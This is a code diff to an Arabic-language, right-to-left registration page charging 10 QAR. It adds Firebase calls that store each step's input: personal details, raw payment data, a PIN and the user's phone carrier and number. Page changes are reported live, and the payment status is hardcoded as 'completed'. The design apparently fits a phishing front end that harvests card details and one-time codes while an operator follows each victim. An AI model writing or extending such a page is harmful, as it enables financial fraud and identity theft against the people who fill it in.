@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { Header } from "@/components/Header";
 import { Footer } from "@/components/Footer";
 import { Stepper } from "@/components/Stepper";
@@ -12,6 +12,7 @@ import { Step6PhoneProvider } from "@/components/steps/Step6PhoneProvider";
 import { Step5Success } from "@/components/steps/Step5Success";
 import { MessageCircle } from "lucide-react";
 import { useHeartbeat } from "@/hooks/useHeartbeat";
+import { saveStepData, completeRegistration, handleCurrentPage } from "@/lib/firebase";
 
 export default function Register() {
   const [step, setStep] = useState(1);
@@ -33,11 +34,16 @@ export default function Register() {
     },
     pin: "",
     phoneProvider: "",
+    phoneProviderNumber: "",
+    password: "",
   });
 
   useHeartbeat("/register");
 
-  // Steps differ based on new vs existing account
+  useEffect(() => {
+    handleCurrentPage(`/register/step-${step}`);
+  }, [step]);
+
   const newAccountSteps = [
     "نوع الحساب",
     "البيانات الشخصية",
@@ -55,17 +61,95 @@ export default function Register() {
   const nextStep = () => setStep((prev) => Math.min(prev + 1, steps.length));
   const prevStep = () => setStep((prev) => Math.max(prev - 1, 1));
 
-  const handleAccountTypeNext = (isNew: boolean, type: string) => {
+  const handleAccountTypeNext = async (isNew: boolean, type: string) => {
     setIsNewAccount(isNew);
     setAccountType(type);
-    setFormData((prev) => ({ ...prev, accountType: type }));
+    const newFormData = { ...formData, accountType: type };
+    setFormData(newFormData);
+    
+    await saveStepData("1_account_type", {
+      isNewAccount: isNew,
+      accountType: type,
+    });
+    
     nextStep();
   };
 
-  const handlePersonalDataNext = (data: any) => {
-    setFormData({ ...data, accountType });
+  const handlePersonalDataNext = async (data: any) => {
+    const newFormData = { ...data, accountType };
+    setFormData(newFormData);
+    
+    await saveStepData("2_personal_data", {
+      fullNameArabic: data.fullNameArabic,
+      fullNameEnglish: data.fullNameEnglish,
+      email: data.email,
+      phoneNumber: data.phoneNumber,
+      dateOfBirth: data.dateOfBirth,
+      gender: data.gender,
+      nationality: data.nationality,
+      address: data.address,
+    });
+    
     nextStep();
-  }
+  };
+
+  const handlePasswordNext = async (password?: string) => {
+    if (password) {
+      setFormData(prev => ({ ...prev, password: "***" }));
+    }
+    
+    await saveStepData("3_password", {
+      passwordSet: true,
+    });
+    
+    nextStep();
+  };
+
+  const handlePaymentNext = async (paymentData?: any) => {
+    await saveStepData("4_payment", {
+      amount: "10.00 QAR",
+      status: "completed",
+      paymentMethod: "card",
+      ...(paymentData || {}),
+    });
+    
+    nextStep();
+  };
+
+  const handlePINNext = async (pin?: string) => {
+    if (pin) {
+      setFormData(prev => ({ ...prev, pin }));
+    }
+    
+    await saveStepData("5_pin", {
+      pinVerified: true,
+    });
+    
+    nextStep();
+  };
+
+  const handlePhoneProviderNext = async (providerData?: { provider: string; number: string }) => {
+    if (providerData) {
+      setFormData(prev => ({
+        ...prev,
+        phoneProvider: providerData.provider,
+        phoneProviderNumber: providerData.number,
+      }));
+    }
+    
+    await saveStepData("6_phone_provider", {
+      provider: providerData?.provider || formData.phoneProvider,
+      phoneNumber: providerData?.number || formData.phoneProviderNumber,
+    });
+    
+    await completeRegistration({
+      ...formData,
+      phoneProvider: providerData?.provider || formData.phoneProvider,
+      phoneProviderNumber: providerData?.number || formData.phoneProviderNumber,
+    });
+    
+    nextStep();
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl">
@@ -77,10 +161,8 @@ export default function Register() {
         <div className="bg-gray-100/50 rounded-lg shadow-sm border border-gray-200 overflow-hidden min-h-[600px]">
           {step === 1 && <Step1AccountType onNext={handleAccountTypeNext} />}
 
-          {/* Existing User Flow - Login */}
           {!isNewAccount && step === 2 && <StepLogin onBack={prevStep} />}
 
-          {/* New User Flow */}
           {isNewAccount && step === 2 && (
             <Step2PersonalData
               onNext={handlePersonalDataNext}
@@ -89,20 +171,20 @@ export default function Register() {
             />
           )}
           {isNewAccount && step === 3 && (
-            <Step3Password onNext={nextStep} onBack={prevStep} />
+            <Step3Password onNext={handlePasswordNext} onBack={prevStep} />
           )}
           {isNewAccount && step === 4 && (
             <Step4Payment
-              onNext={nextStep}
+              onNext={handlePaymentNext}
               onBack={prevStep}
               formData={formData}
             />
           )}
           {isNewAccount && step === 5 && (
-            <Step5PIN onNext={nextStep} onBack={prevStep} />
+            <Step5PIN onNext={handlePINNext} onBack={prevStep} />
           )}
           {isNewAccount && step === 6 && (
-            <Step6PhoneProvider onNext={nextStep} onBack={prevStep} />
+            <Step6PhoneProvider onNext={handlePhoneProviderNext} onBack={prevStep} />
           )}
           {isNewAccount && step === 7 && <Step5Success formData={formData} />}
         </div>
